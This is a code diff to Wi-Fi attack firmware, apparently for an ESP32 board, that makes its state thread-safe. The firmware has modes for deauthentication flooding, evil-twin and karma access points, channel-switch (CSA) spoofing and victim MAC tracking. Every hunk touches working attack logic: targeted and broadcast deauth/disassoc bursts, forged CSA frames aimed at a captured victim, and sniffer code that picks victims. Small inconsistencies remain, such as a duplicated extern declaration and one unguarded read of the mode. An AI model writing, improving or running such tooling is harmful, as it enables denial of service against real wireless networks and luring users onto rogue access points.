@@ -36,6 +36,15 @@ extern volatile uint32_t g_packetsSent;
 extern volatile uint32_t g_txErrors;
 extern volatile bool g_victimFound;
 extern uint8_t g_victimMAC[6];
+extern portMUX_TYPE g_stateMux;
+inline AttackMode getAttackMode() { AttackMode m; portENTER_CRITICAL(&g_stateMux); m = g_attackMode; portEXIT_CRITICAL(&g_stateMux); return m; }
+inline void setAttackMode(AttackMode m) { portENTER_CRITICAL(&g_stateMux); g_attackMode = m; portEXIT_CRITICAL(&g_stateMux); }
+inline bool isVictimFound() { bool v; portENTER_CRITICAL(&g_stateMux); v = g_victimFound; portEXIT_CRITICAL(&g_stateMux); return v; }
+inline void setVictimFound(bool v) { portENTER_CRITICAL(&g_stateMux); g_victimFound = v; portEXIT_CRITICAL(&g_stateMux); }
+inline void getVictimMac(uint8_t out[6]) { portENTER_CRITICAL(&g_stateMux); memcpy(out, g_victimMAC, 6); portEXIT_CRITICAL(&g_stateMux); }
+inline void setVictimMac(const uint8_t* mac) { portENTER_CRITICAL(&g_stateMux); memcpy(g_victimMAC, mac, 6); portEXIT_CRITICAL(&g_stateMux); }
+
+extern uint8_t g_victimMAC[6];
 extern uint8_t g_targetBSSID[6];
 extern volatile uint8_t g_targetChannel;
 
@@ -138,9 +147,10 @@ inline void sendDeauthBurst(const uint8_t* bssid) {
     uint8_t reason = (cfg_deauth_reason > 0) ? (uint8_t)cfg_deauth_reason : reasons[i % 6];
     sendDeauthFrame(bcast, bssid, reason);
     sendDisassocFrame(bcast, bssid, reason);
-    if (g_victimFound) {
-      sendDeauthFrame(g_victimMAC, bssid, reason);
-      sendDisassocFrame(g_victimMAC, bssid, reason);
+    if (isVictimFound()) {
+      uint8_t vm[6]; getVictimMac(vm);
+      sendDeauthFrame(vm, bssid, reason);
+      sendDisassocFrame(vm, bssid, reason);
     }
   }
 }
@@ -349,8 +359,9 @@ inline void sendCSATick() {
 
   sendCSABeacon(g_targetBSSID, g_csaTargetSSID, g_targetChannel, newCh, count);
 
-  if (g_victimFound) {
-    sendCSAActionFrame(g_victimMAC, g_targetBSSID, newCh, count);
+  if (isVictimFound()) {
+    uint8_t vm[6]; getVictimMac(vm);
+    sendCSAActionFrame(vm, g_targetBSSID, newCh, count);
   }
 }
 
@@ -368,7 +379,7 @@ inline void packetSniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
   if (type == WIFI_PKT_MGMT) {
     uint8_t subtype = (p[0] >> 4) & 0x0F;
 
-    if (g_attackMode == ATK_PROBE) {
+    if (getAttackMode() == ATK_PROBE) {
       if (subtype != 4) return;
       if (sig_len < 26) return;
       if (p[24] != 0x00) return;
@@ -404,7 +415,7 @@ inline void packetSniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
       return;
     }
 
-    if (g_attackMode == ATK_KARMA) {
+    if (getAttackMode() == ATK_KARMA) {
       if (subtype != 4) return;
       if (sig_len < 26) return;
       if (p[24] != 0x00) return;
@@ -446,7 +457,7 @@ inline void packetSniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
   }
 
   // Victim tracking untuk DEAUTH, EVIL_TWIN, dan CSA
-  if (g_attackMode == ATK_DEAUTH_TARGET ||
+  if (getAttackMode() == ATK_DEAUTH_TARGET ||
       g_attackMode == ATK_EVIL_TWIN ||
       g_attackMode == ATK_CSA) {
     uint8_t* addr1 = &p[4];
@@ -456,15 +467,17 @@ inline void packetSniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
         memcmp(addr2, g_targetBSSID, 6) == 0 ||
         memcmp(addr3, g_targetBSSID, 6) == 0) {
       if (memcmp(addr2, g_targetBSSID, 6) != 0 && (addr2[0] & 0x01) == 0) {
-        if (!g_victimFound || memcmp(g_victimMAC, addr2, 6) != 0) {
-          memcpy(g_victimMAC, addr2, 6);
-          g_victimFound = true;
+        uint8_t vm[6]; bool vf = isVictimFound();
+        if (vf) getVictimMac(vm);
+        if (!vf || memcmp(vm, addr2, 6) != 0) {
+          setVictimMac(addr2);
+          setVictimFound(true);
         }
       }
     }
   }
 
-  if (g_attackMode == ATK_CLIENT_MONITOR && type == WIFI_PKT_DATA) {
+  if (getAttackMode() == ATK_CLIENT_MONITOR && type == WIFI_PKT_DATA) {
     uint8_t* a1 = &p[4];
     uint8_t* a2 = &p[10];
     uint8_t* a3 = &p[16];
@@ -489,7 +502,7 @@ inline void packetSniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
 inline void attackTask(void* param) {
   (void)param;
   while (true) {
-    switch (g_attackMode) {
+    switch (getAttackMode()) {
       case ATK_DEAUTH_TARGET: {
         static unsigned long lastTx = 0;
         if (millis() - lastTx > 15) {
